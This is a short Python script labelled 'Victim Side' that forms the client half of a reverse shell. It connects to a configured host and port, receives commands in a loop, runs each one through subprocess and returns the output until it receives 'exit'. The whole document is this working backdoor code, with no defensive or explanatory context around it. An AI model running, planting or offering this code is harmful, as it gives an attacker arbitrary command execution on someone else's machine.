# Victim Side
import socket, subprocess
host, port = "0.0.0.0", 5004 
with socket.socket() as sc:
    sc.connect((host, port))
    get = sc.recv(1024).decode()
    while True:
        cmd = sc.recv(1024).decode()
        if cmd.lower() == "exit":
            break
        otp = subprocess.getoutput(cmd)
        sc.send(otp.encode())
